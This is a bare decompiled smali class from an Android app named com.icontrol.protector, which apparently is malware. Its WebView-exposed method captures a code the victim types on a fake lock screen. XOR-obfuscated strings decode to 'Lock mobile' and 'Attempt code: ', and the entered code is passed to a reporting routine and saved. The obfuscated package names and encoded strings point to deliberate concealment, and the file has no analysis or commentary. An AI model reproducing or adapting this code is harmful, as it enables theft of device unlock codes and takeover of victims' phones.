.class public Lcom/icontrol/protector/LockActivity$d;
.super Ljava/lang/Object;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/icontrol/protector/LockActivity;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "d"
.end annotation


# instance fields
.field a:Landroid/content/Context;

.field final synthetic b:Lcom/icontrol/protector/LockActivity;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/LockActivity;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/LockActivity$d;->b:Lcom/icontrol/protector/LockActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p2, p0, Lcom/icontrol/protector/LockActivity$d;->a:Landroid/content/Context;

    return-void
.end method


# virtual methods
.method public OK(Ljava/lang/String;)V
    .locals 5
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    :try_start_0
    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    const/16 v1, 0xb

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v4, 0xe

    new-array v4, v4, [B

    fill-array-data v4, :array_2

    new-array v2, v2, [B

    fill-array-data v2, :array_3

    invoke-static {v4, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    const/4 v1, 0x4

    if-lt v0, v1, :cond_1

    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    invoke-static {v0, p1}, Lcom/icontrol/protector/n;->m(Landroid/content/Context;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->J:Ljava/lang/String;

    const-string v2, ""

    invoke-static {v0, v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1

    sget-object p1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->I:Ljava/lang/String;

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :goto_0
    iget-object p1, p0, Lcom/icontrol/protector/LockActivity$d;->b:Lcom/icontrol/protector/LockActivity;

    invoke-virtual {p1}, Landroid/app/Activity;->finish()V

    goto :goto_1

    :cond_0
    sget-object p1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->I:Ljava/lang/String;

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    :cond_1
    :goto_1
    return-void

    :array_0
    .array-data 1
        0x8t
        0x18t
        0x66t
        -0x2at
        -0xdt
        0x3ct
        0x1dt
        -0x17t
        0x2dt
        0x1bt
        0x60t
    .end array-data

    :array_1
    .array-data 1
        0x44t
        0x77t
        0x5t
        -0x43t
        -0x2dt
        0x51t
        0x72t
        -0x75t
    .end array-data

    :array_2
    .array-data 1
        0x2ct
        -0x7t
        0xbt
        0x54t
        -0x72t
        0x1t
        0x7t
        0x21t
        0xet
        -0x1et
        0x1bt
        0x54t
        -0x27t
        0x51t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x6dt
        -0x73t
        0x7ft
        0x31t
        -0x1dt
        0x71t
        0x73t
        0x1t
    .end array-data
.end method
